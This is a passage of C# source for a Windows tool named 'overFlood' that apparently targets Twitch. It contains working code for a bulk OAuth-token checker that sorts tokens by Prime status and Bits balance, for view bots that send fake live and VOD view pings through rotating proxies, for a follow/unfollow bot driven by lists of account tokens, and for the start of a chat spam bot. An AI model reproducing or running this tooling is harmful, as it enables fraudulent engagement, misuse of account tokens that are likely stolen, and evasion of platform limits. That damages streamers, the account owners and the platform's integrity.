                        {
                            Interlocked.Increment(ref tokenCheckerBad);
                            lblTokenCheckerBad.Text = $"Invalid: {tokenCheckerBad}";
                            Interlocked.Increment(ref tokenCheckerChecks);
                            lblTokenCheckerChecked.Text = $"Checked: {tokenCheckerChecks}/{tokenCheckerTotal}";
                            return;
                        }
                        string text2;
                        while ((text2 = GetPrimeInfo(token, text)) == "request error")
                        {
                        }
                        CheckPrimeInfo(token, text2);
                        Interlocked.Increment(ref tokenCheckerChecks);
                        lblTokenCheckerChecked.Text = $"Checked: {tokenCheckerChecks}/{tokenCheckerTotal}";
                    }
                    catch (Exception)
                    {
                        Interlocked.Increment(ref tokenCheckerBad);
                        lblTokenCheckerBad.Text = $"Invalid: {tokenCheckerBad}";
                        Interlocked.Increment(ref tokenCheckerChecks);
                        lblTokenCheckerChecked.Text = $"Checked: {tokenCheckerChecks}/{tokenCheckerTotal}";
                    }
                }), cancellationToken);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            workingTokens.Dispose();
            primeTokens.Dispose();
            primeAvailableTokens.Dispose();
            bitsTokens.Dispose();

            btnTokenCheckerLoadTokens.Enabled = true;
            txtTokenCheckerThreads.Enabled = true;
            btnTokenCheckerStart.Enabled = true;
            btnTokenCheckerStop.Enabled = false;
            MessageBox.Show($"Checked {tokenCheckerChecks} tokens. The results are stored in the 'Results' directory.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void CreateDirectory()
        {
            string text = string.Format("Results/TC-{0:MM-dd-yy-hh-mm-ss}", DateTime.Now);
            Directory.CreateDirectory(text);
            workingTokens = new StreamWriter(string.Format("{0}/tokens.txt", text), true)
            {
                AutoFlush = true
            };
            primeTokens = new StreamWriter(string.Format("{0}/prime-tokens.txt", text), true)
            {
                AutoFlush = true
            };
            primeAvailableTokens = new StreamWriter(string.Format("{0}/prime-available-tokens.txt", text), true)
            {
                AutoFlush = true
            };
            bitsTokens = new StreamWriter(string.Format("{0}/bits-tokens.txt", text), true)
            {
                AutoFlush = true
            };
        }

        private string CheckToken(string token)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.KeepAlive = true;
                httpRequest.AddHeader("Authorization", "OAuth " + token);
                httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                try
                {
                    string input = httpRequest.Post("https://gql.twitch.tv/gql", "[{\"operationName\":\"BitsCard_Bits\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2\"}}},{\"operationName\":\"BitsCard_MainCard\",\"variables\":{\"name\":\"214062798\",\"withCheerBombEventEnabled\":false},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848\"}}}]", "text/plain;charset=UTF-8").ToString();
                    result = new Regex("login\":\"(.*?)\"").Match(input).Groups[1].Value;
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private string GetPrimeInfo(string token, string username)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.UserAgent = Http.RandomUserAgent();
                httpRequest.Referer = "https://www.twitch.tv/";
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.Reconnect = false;
                httpRequest.Authorization = "OAuth " + token;
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Origin", "https://twitch.tv");
                httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                string str = "[{\"operationName\":\"PrimeSubscribe_UserPrimeData\",\"variables\":{\"login\":\"" + username + "\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"58c25a2b0ccbde33498f3a5cf6027ff32168febd8a63b749f184028e8ab9192a\"}}},{\"operationName\":\"Inventory\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"22c44231a1332132801f93866bdf1c985995df85e87e2dec45a24fbb66e9a03c\"}}}]";
                try
                {
                    result = httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString();
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private void CheckPrimeInfo(string token, string responseString)
        {
            Interlocked.Increment(ref tokenCheckerGood);
            lblTokenCheckerGood.Text = $"Hits: {tokenCheckerGood}";

            bool isPrime = responseString.Contains("hasPrime\":true") && responseString.Contains("willRenew\":true");
            bool isPrimeAvailable = responseString.Contains("canPrimeSubscribe\":true");

            if (isPrimeAvailable)
            {
                WriteLine(primeAvailableTokens, token);
                Interlocked.Increment(ref primeAvailable);
                lblTokenCheckerPrimeAvailable.Text = $"Prime Available: {primeAvailable}";
            }
            else if (isPrime)
            {
                string date = new Regex("renewalDate\":(.*?),\"").Match(responseString).Groups[1].Value.Substring(1).Split(new char[]
{
                    'T'
})[0];
                string time = new Regex("renewalDate\":(.*?),\"").Match(responseString).Groups[1].Value.Substring(1).Split(new char[]
                {
                    'T'
                })[1];
                WriteLine(primeTokens, token + ":" + date + " " + time.Split(':')[0] + ":" + time.Split(':')[1] + ":" + time.Split(':')[2].Replace(time.Split('.')[1], "").Replace(".", ""));
                Interlocked.Increment(ref primes);
                lblTokenCheckerPrimes.Text = $"Primes: {primes}";
            }
            else
            {
                WriteLine(workingTokens, token);
            }

            int.TryParse(new Regex("bitsBalance\":(.*?),\"").Match(responseString).Groups[1].Value, out int bits);

            if (bits > 0)
            {
                WriteLine(bitsTokens, string.Format("{0}:{1}", token, bits));
                Interlocked.Add(ref overallBits, bits);
                lblTokenCheckerBits.Text = $"Bits: {overallBits}";
            }
        }

        private void btnTokenCheckerStop_Click(object sender, EventArgs e)
        {
            tokenCheckerTokenSource.Cancel();
        }
        #endregion

        #region Live View Bot Methods
        private void btnViewLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                viewProxies = Utilities.LoadFile(fileName);
                lblViewBotProxies.Text = $"Proxies: {viewProxies.Count()}";
                MessageBox.Show($"Loaded {viewProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnViewStart_Click(object sender, EventArgs e)
        {
            if (viewProxies == null || !viewProxies.Any())
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            txtViewChannel.Text = txtViewChannel.Text.ToLower();
            txtViewChannel.Enabled = false;
            txtViewThreads.Enabled = false;
            comboViewProxyType.Enabled = false;
            btnViewLoadProxies.Enabled = false;
            txtViewTimeout.Enabled = false;
            viewRequests = 0;
            viewRequestsFailed = 0;
            lblViewRequests.Text = "Requests Sent: 0";
            lblViewRequestsFailed.Text = "Requests Failed: 0";
            btnViewStart.Enabled = false;
            btnViewStop.Enabled = true;

            ThreadPool.SetMinThreads(Convert.ToInt32(txtViewThreads.Text), Convert.ToInt32(txtViewThreads.Text));

            viewTokenSource = new CancellationTokenSource();
            CancellationToken token = viewTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtViewThreads.Text),
                CancellationToken = token
            };

            try
            {
                await Task.Run(() => Parallel.For(0, Convert.ToInt32(txtViewThreads.Text), parallelOptions, ViewThread), token);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            txtViewChannel.Enabled = true;
            txtViewThreads.Enabled = true;
            comboViewProxyType.Enabled = true;
            btnViewLoadProxies.Enabled = true;
            txtViewTimeout.Enabled = true;
            btnViewStart.Enabled = true;
            btnViewStop.Enabled = false;
            MessageBox.Show($"Sent {viewRequests} requests to {txtViewChannel.Text}.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void ViewThread(int i)
        {
            while (!viewTokenSource.IsCancellationRequested)
            {
                try
                {
                    HttpRequest httpRequest = new HttpRequest();
                    httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                    httpRequest.EnableEncodingContent = false;
                    httpRequest.AddHeader(HttpHeader.Accept, "application/vnd.twitchtv.v5+json; charset=UTF-8");
                    httpRequest.AddHeader(HttpHeader.AcceptLanguage, "en-us");
                    httpRequest.AddHeader(HttpHeader.ContentType, "application/json; charset=UTF-8");
                    httpRequest.AddHeader(HttpHeader.Referer, "https://www.twitch.tv/" + txtViewChannel.Text);
                    httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    httpRequest.AddHeader("Client-ID", "jzkbprff40iqj646a697cyrvl0zt2m6");
                    string self = httpRequest.Get("https://api.twitch.tv/api/channels/" + txtViewChannel.Text + "/access_token?oauth_token=undefined&need_https=true&platform=web&player_type=site&player_backend=mediaplayer", null).ToString();
                    string text = self.Substring("token\":\"", "\",\"sig", 0, StringComparison.Ordinal, null).Replace("\\", "").Replace("u0026", "\\u0026").Replace("+", "%2B").Replace(":", "%3A").Replace(",", "%2C").Replace("[", "%5B").Replace("]", "%5D").Replace("'", "%27");
                    string text2 = self.Substring("sig\":\"", "\",\"mobile", 0, StringComparison.Ordinal, null);
                    while (!viewTokenSource.IsCancellationRequested)
                    {
                        httpRequest.AddHeader(HttpHeader.Accept, "application/x-mpegURL, application/vnd.apple.mpegurl, application/json, text/plain");
                        httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                        string address = "https://" + httpRequest.Get(string.Concat(new string[]
                        {
                            "https://usher.ttvnw.net/api/channel/hls/",
                            txtViewChannel.Text,
                            ".m3u8?sig=",
                            text2,
                            "&token=",
                            text
                        }), null).ToString().Substring("https://", ".m3u8", 0, StringComparison.Ordinal, null) + ".m3u8";

                        ProxyType proxyType;

                        switch (comboViewProxyType.Text)
                        {
                            case "HTTP":
                                proxyType = ProxyType.HTTP;
                                break;
                            case "SOCKS4":
                                proxyType = ProxyType.Socks4;
                                break;
                            case "SOCKS4a":
                                proxyType = ProxyType.Socks4A;
                                break;
                            case "SOCKS5":
                                proxyType = ProxyType.Socks5;
                                break;
                            default:
                                proxyType = ProxyType.HTTP;
                                break;
                        }

                        httpRequest.Proxy = ProxyClient.Parse(proxyType, viewProxies[new Random().Next(viewProxies.Count())]);
                        httpRequest.ConnectTimeout = Convert.ToInt32(txtViewTimeout.Text);
                        httpRequest.ReadWriteTimeout = Convert.ToInt32(txtViewTimeout.Text);
                        httpRequest.AddHeader(HttpHeader.Accept,
                            "application/x-mpegURL, application/vnd.apple.mpegurl, application/json, text/plain");
                        httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                        httpRequest.EnableEncodingContent = false;
                        httpRequest.Raw(HttpMethod.HEAD, address, null);
                        Interlocked.Increment(ref viewRequests);
                        lblViewRequests.Text = $"Requests Sent: {viewRequests}";
                        Thread.Sleep(5);
                    }
                }
                catch (Exception)
                {
                    Interlocked.Increment(ref viewRequestsFailed);
                    lblViewRequestsFailed.Text = $"Requests Failed: {viewRequestsFailed}";
                }
            }
        }

        private void btnViewStop_Click(object sender, EventArgs e)
        {
            viewTokenSource.Cancel();
        }
        #endregion

        #region Channel View Bot Methods
        private void btnChannelLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                channelViewProxies = Utilities.LoadFile(fileName);
                lblChannelProxies.Text = $"Proxies: {channelViewProxies.Count()}";
                MessageBox.Show($"Loaded {channelViewProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string channelViewId;

        private async void btnChannelStart_Click(object sender, EventArgs e)
        {
            if (txtChannel.Text == "")
            {
                MessageBox.Show("Please enter a channel name.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (channelViewProxies == null || !channelViewProxies.Any())
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            channelViewId = GetChannel(txtChannel.Text);

            if (string.IsNullOrEmpty(channelViewId))
            {
                MessageBox.Show("The streamer doesn't exist or an error occured.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            txtChannel.Enabled = false;
            btnChannelLoadProxies.Enabled = false;
            txtChannelThreads.Enabled = false;
            comboChannelType.Enabled = false;
            txtChannelTimeout.Enabled = false;
            btnChannelStart.Enabled = false;
            btnChannelStop.Enabled = true;
            lblChannelRequests.Text = "Requests Sent: 0";
            lblChannelFailedRequests.Text = "Requests Failed: 0";
            channelRequests = 0;
            failChannelRequests = 0;

            ThreadPool.SetMinThreads(Convert.ToInt32(txtChannelThreads.Text), Convert.ToInt32(txtChannelThreads.Text));

            channelTokenSource = new CancellationTokenSource();
            CancellationToken token = channelTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtChannelThreads.Text),
                CancellationToken = token
            };

            try
            {
                await Task.Run(() => Parallel.For(0, Convert.ToInt32(txtChannelThreads.Text), parallelOptions, ChannelViewThread), token);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            txtChannel.Enabled = true;
            btnChannelLoadProxies.Enabled = true;
            txtChannelThreads.Enabled = true;
            comboChannelType.Enabled = true;
            txtChannelTimeout.Enabled = true;
            btnChannelStart.Enabled = true;
            btnChannelStop.Enabled = false;
            MessageBox.Show($"Sent {channelRequests} requests to {txtChannel.Text}", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void ChannelViewThread(int i)
        {
            string url = "http://countess.twitch.tv/ping.gif?u=%7B%22type%22%3A%22channel%22%2C%22id%22%3A" + channelViewId + "%7D";
            var proxy = channelViewProxies[new Random().Next(channelViewProxies.Count())];

            while (!channelTokenSource.IsCancellationRequested)
            {
                try
                {
                    HttpRequest request = new HttpRequest();

                    ProxyType proxyType;

                    switch (comboChannelType.Text)
                    {
                        case "HTTP":
                            proxyType = ProxyType.HTTP;
                            break;
                        case "SOCKS4":
                            proxyType = ProxyType.Socks4;
                            break;
                        case "SOCKS4a":
                            proxyType = ProxyType.Socks4A;
                            break;
                        case "SOCKS5":
                            proxyType = ProxyType.Socks5;
                            break;
                        default:
                            proxyType = ProxyType.HTTP;
                            break;
                    }

                    request.Proxy = ProxyClient.Parse(proxyType, proxy);
                    request.UserAgent = Http.RandomUserAgent();
                    request.ConnectTimeout = Convert.ToInt32(txtChannelTimeout.Text);
                    request.ReadWriteTimeout = Convert.ToInt32(txtChannelTimeout.Text);
                    string TotalViewResponse = request.Get(url).ToString();
                    Interlocked.Increment(ref channelRequests);
                    lblChannelRequests.Text = $"Requests Sent: {channelRequests}";
                }
                catch (Exception)
                {
                    Interlocked.Increment(ref failChannelRequests);
                    lblChannelFailedRequests.Text = $"Requests Failed: {failChannelRequests}";
                }
            }
        }

        private void btnChannelStop_Click(object sender, EventArgs e)
        {
            channelTokenSource.Cancel();
        }
        #endregion

        #region VOD Views Bot Methods
        private void btnVODLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                vodViewProxies = Utilities.LoadFile(fileName);
                lblVODProxies.Text = $"Proxies: {vodViewProxies.Count()}";
                MessageBox.Show($"Loaded {vodViewProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        int vodChannelId;

        private async void btnVODStart_Click(object sender, EventArgs e)
        {
            if (txtVODID.Text == "")
            {
                MessageBox.Show("Please enter a video ID.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (vodViewProxies == null || !vodViewProxies.Any())
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            vodChannelId = Convert.ToInt32(txtVODID.Text);

            txtVODID.Enabled = false;
            btnVODLoadProxies.Enabled = false;
            txtVODThreads.Enabled = false;
            comboVODType.Enabled = false;
            txtVODTimeout.Enabled = false;
            btnVODStart.Enabled = false;
            btnVODStop.Enabled = true;
            lblVODRequests.Text = "Requests Sent: 0";
            lblVODRequestsFailed.Text = "Requests Failed: 0";
            vodRequests = 0;
            failVodRequests = 0;

            ThreadPool.SetMinThreads(Convert.ToInt32(txtVODThreads.Text), Convert.ToInt32(txtVODThreads.Text));

            vodTokenSource = new CancellationTokenSource();
            CancellationToken token = vodTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtVODThreads.Text),
                CancellationToken = token
            };

            try
            {
                await Task.Run(() => Parallel.For(0, Convert.ToInt32(txtVODThreads.Text), parallelOptions, VodViewThread), token);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            txtVODID.Enabled = true;
            btnVODLoadProxies.Enabled = true;
            txtVODThreads.Enabled = true;
            comboVODType.Enabled = true;
            txtVODTimeout.Enabled = true;
            btnVODStart.Enabled = true;
            btnVODStop.Enabled = false;
            MessageBox.Show($"Sent {vodRequests} requests to {txtVODID.Text}", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void VodViewThread(int i)
        {
            string url = "https://countess.twitch.tv/ping.gif?u=%7B%22type%22%3A%22vod%22%2C%22id%22%3A%22" + vodChannelId + "%22%7D";
            var proxy = vodViewProxies[new Random().Next(vodViewProxies.Count())];

            while (!vodTokenSource.IsCancellationRequested)
            {
                try
                {
                    HttpRequest request = new HttpRequest();

                    ProxyType proxyType;

                    switch (comboVODType.Text)
                    {
                        case "HTTP":
                            proxyType = ProxyType.HTTP;
                            break;
                        case "SOCKS4":
                            proxyType = ProxyType.Socks4;
                            break;
                        case "SOCKS4a":
                            proxyType = ProxyType.Socks4A;
                            break;
                        case "SOCKS5":
                            proxyType = ProxyType.Socks5;
                            break;
                        default:
                            proxyType = ProxyType.HTTP;
                            break;
                    }

                    request.Proxy = ProxyClient.Parse(proxyType, proxy);
                    request.UserAgent = Http.RandomUserAgent();
                    request.ConnectTimeout = Convert.ToInt32(txtVODTimeout.Text);
                    request.ReadWriteTimeout = Convert.ToInt32(txtVODTimeout.Text);
                    string TotalViewResponse = request.Get(url).ToString();
                    Interlocked.Increment(ref vodRequests);
                    lblVODRequests.Text = $"Requests Sent: {vodRequests}";
                }
                catch (Exception)
                {
                    Interlocked.Increment(ref failVodRequests);
                    lblVODRequestsFailed.Text = $"Requests Failed: {failVodRequests}";
                }
            }
        }

        private void btnVODStop_Click(object sender, EventArgs e)
        {
            vodTokenSource.Cancel();
        }
        #endregion

        #region Follow Bot Methods
        private void chkFollowUseProxies_CheckedChanged(object sender, EventArgs e)
        {
            btnFollowLoadProxies.Enabled = chkFollowUseProxies.Checked;
            txtFollowTimeout.Enabled = chkFollowUseProxies.Checked;
        }

        private void btnFollowLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                followProxies = Utilities.LoadFile(fileName);
                lblFollowProxies.Text = $"Proxies: {followProxies.Count()}";
                MessageBox.Show($"Loaded {followProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnFollowLoadTokens_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Tokens");
                if (string.IsNullOrEmpty(fileName)) return;
                followTokens = Utilities.LoadFile(fileName);
                lblFollowTokens.Text = $"Tokens: {followTokens.Count()}";
                MessageBox.Show($"Loaded {followTokens.Count()} tokens.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private bool follow;

        private async void btnFollowStart_Click(object sender, EventArgs e)
        {
            if (txtFollowChannel.Text == "")
            {
                MessageBox.Show("Please enter a channel name.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (chkFollowUseProxies.Checked && (followProxies == null || !followProxies.Any()))
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (followTokens == null || !followTokens.Any())
            {
                MessageBox.Show("Upload tokens list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (Convert.ToInt32(txtFollowAmount.Text) > followTokens.Count())
            {
                MessageBox.Show("The follow amount cannot be greater than the amount of tokens.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            followChannelId = GetChannel(txtFollowChannel.Text);

            if (string.IsNullOrEmpty(followChannelId))
            {
                MessageBox.Show("The streamer doesn't exist or an error occured.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            follow = radioFollow.Checked;

            radioFollow.Enabled = false;
            radioUnfollow.Enabled = false;
            btnFollowLoadTokens.Enabled = false;
            txtFollowChannel.Enabled = false;
            txtFollowAmount.Enabled = false;
            txtFollowThreads.Enabled = false;
            btnFollowLoadProxies.Enabled = false;
            comboFollowProxyType.Enabled = false;
            txtFollowTimeout.Enabled = false;
            btnFollowStart.Enabled = false;
            btnFollowStop.Enabled = true;
            lblFollowSent.Text = "Follows Sent: 0";
            lblFollowRemoved.Text = "Follows Removed: 0";
            lblFollowFail.Text = "Failed: 0";
            followSent = 0;
            followRemoved = 0;
            followFailed = 0;

            ThreadPool.SetMinThreads(Convert.ToInt32(txtFollowThreads.Text), Convert.ToInt32(txtFollowThreads.Text));

            followTokenSource = new CancellationTokenSource();
            CancellationToken token = followTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtFollowThreads.Text),
                CancellationToken = token
            };

            try
            {
                await Task.Run(() => Parallel.ForEach(followTokens.Take(Convert.ToInt32(txtFollowAmount.Text)), parallelOptions, FollowThread), token);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            radioFollow.Enabled = true;
            radioUnfollow.Enabled = true;
            btnFollowLoadTokens.Enabled = true;
            txtFollowChannel.Enabled = true;
            txtFollowAmount.Enabled = true;
            txtFollowThreads.Enabled = true;
            btnFollowLoadProxies.Enabled = true;
            comboFollowProxyType.Enabled = true;
            txtFollowTimeout.Enabled = true;
            btnFollowStart.Enabled = true;
            btnFollowStop.Enabled = false;

            if (follow)
                MessageBox.Show($"Sent {followSent} follows to {txtFollowChannel.Text}", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else
                MessageBox.Show($"Removed {followRemoved} follows from {txtFollowChannel.Text}", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void FollowThread(string token)
        {
            if (followTokenSource.IsCancellationRequested)
            {
                return;
            }
            
            try
            {
                if (token.Contains(":"))
                    token = token.Contains("oauth:") ? token.Split(':')[1] : token.Split(':')[0];
                string userId = CheckToken1(token);
                string text;
                while ((text = FollowChannel(token)) == "request error")
                {
                }
                if (follow)
                {
                    if (!text.Contains("id\":\"" + followChannelId + "\",\"displayName\":"))
                    {
                        Interlocked.Increment(ref followFailed);
                        lblFollowFail.Text = $"Failed: {followFailed}";
                    }
                    else
                    {
                        Interlocked.Increment(ref followSent);
                        lblFollowSent.Text = $"Follows Sent: {followSent}";
                    }
                }
                else
                {
                    if (!text.Contains("[{\"data\":{\"unfollowUser\":{\"follow\""))
                    {
                        Interlocked.Increment(ref followFailed);
                        lblFollowFail.Text = $"Failed: {followFailed}";
                    }
                    else
                    {
                        Interlocked.Increment(ref followRemoved);
                        lblFollowRemoved.Text = $"Follows Removed: {followRemoved}";
                    }
                }
            }
            catch (Exception)
            {
                Interlocked.Increment(ref followFailed);
                lblFollowFail.Text = $"Failed: {followFailed}";
            }

            Thread.Sleep(Convert.ToInt32(txtFollowDelay.Text));
        }

        private string FollowChannel(string token)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                try
                {
                    if (chkFollowUseProxies.Checked)
                    {
                        ProxyType proxyType;

                        switch (comboFollowProxyType.Text)
                        {
                            case "HTTP":
                                proxyType = ProxyType.HTTP;
                                break;
                            case "SOCKS4":
                                proxyType = ProxyType.Socks4;
                                break;
                            case "SOCKS4a":
                                proxyType = ProxyType.Socks4A;
                                break;
                            case "SOCKS5":
                                proxyType = ProxyType.Socks5;
                                break;
                            default:
                                proxyType = ProxyType.HTTP;
                                break;
                        }

                        int index = new Random().Next(followProxies.Count());
                        ProxyClient proxyClient = ProxyClient.Parse(proxyType, followProxies[index]);
                        proxyClient.ReadWriteTimeout = Convert.ToInt32(txtFollowTimeout.Text);
                        proxyClient.ConnectTimeout = Convert.ToInt32(txtFollowTimeout.Text);
                        httpRequest.Proxy = proxyClient;
                    }

                    httpRequest.UserAgent = Http.RandomUserAgent();
                    httpRequest.Referer = "https://www.twitch.tv/";
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.Reconnect = false;
                    httpRequest.Authorization = "OAuth " + token;
                    httpRequest.AddHeader("Pragma", "no-cache");
                    httpRequest.AddHeader("Origin", "https://twitch.tv");
                    httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                    string str;
                    if (follow)
                        str = "[{\"operationName\":\"FollowButton_FollowUser\",\"variables\":{\"input\":{\"disableNotifications\":false,\"targetID\":\"" + followChannelId + "\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"51956f0c469f54e60211ea4e6a34b597d45c1c37b9664d4b62096a1ac03be9e6\"}}}]";
                    else
                        str = "[{\"operationName\":\"FollowButton_UnfollowUser\",\"variables\":{\"input\":{\"targetID\":\"" + followChannelId + "\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"d7fbdb4e9780dcdc0cc1618ec783309471cd05a59584fc3c56ea1c52bb632d41\"}}}]";
                    result = httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString();
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private void btnFollowStop_Click(object sender, EventArgs e)
        {
            followTokenSource.Cancel();
        }
        #endregion

        #region Chat Bot Methods
        private void chkChatUseProxies_CheckedChanged(object sender, EventArgs e)
        {
            btnChatLoadProxies.Enabled = chkChatUseProxies.Checked;
            txtChatTimeout.Enabled = chkChatUseProxies.Checked;
        }

        private void btnChatLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                chatProxies = Utilities.LoadFile(fileName);
                lblChatProxies.Text = $"Proxies: {chatProxies.Count()}";
                MessageBox.Show($"Loaded {chatProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnChatLoadTokens_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Tokens");
                if (string.IsNullOrEmpty(fileName)) return;
                chatTokens = Utilities.LoadFile(fileName);
                lblChatTokens.Text = $"Tokens: {chatTokens.Count()}";
                MessageBox.Show($"Loaded {chatTokens.Count()} tokens.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnLoadMessages_Click(object sender, EventArgs e)
        {
            string fileName = Utilities.OpenFileDialog("Load Messages");
            if (string.IsNullOrEmpty(fileName)) return;
            messages = Utilities.LoadFile(fileName);
            lblMessages.Text = $"Messages: {messages.Count()}";
            MessageBox.Show($"Loaded {messages.Count()} messages.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private async void btnChatStart_Click(object sender, EventArgs e)
        {
            if (chkChatUseProxies.Checked && (chatProxies == null || !chatProxies.Any()))
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (chatTokens == null || !chatTokens.Any())
            {
                MessageBox.Show("Upload tokens list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (messages == null || !messages.Any())
            {
                MessageBox.Show("Upload messages list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            comboChatProxyType.Enabled = false;
            txtChatTimeout.Enabled = false;
            txtChatChannel.Enabled = false;
            txtChatBots.Enabled = false;
            txtChatDelay.Enabled = false;
            btnChatLoadProxies.Enabled = false;
            btnChatLoadTokens.Enabled = false;
            btnLoadMessages.Enabled = false;
